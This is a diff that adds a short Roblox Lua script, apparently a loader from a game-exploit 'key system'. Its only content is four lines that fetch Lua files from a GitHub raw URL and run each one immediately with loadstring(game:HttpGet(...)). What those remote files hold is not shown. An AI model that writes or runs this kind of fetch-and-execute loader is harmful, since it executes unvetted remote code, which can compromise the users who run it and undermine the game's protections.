@@ -1,0 +1,7 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Key-System-User/ndag/refs/heads/main/1.lua"))()
+wait(0.01)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Key-System-User/ndag/refs/heads/main/4.lua"))()
+wait(0.01)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Key-System-User/ndag/refs/heads/main/3.lua"))()
+wait(0.01)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Key-System-User/ndag/refs/heads/main/2.lua"))()
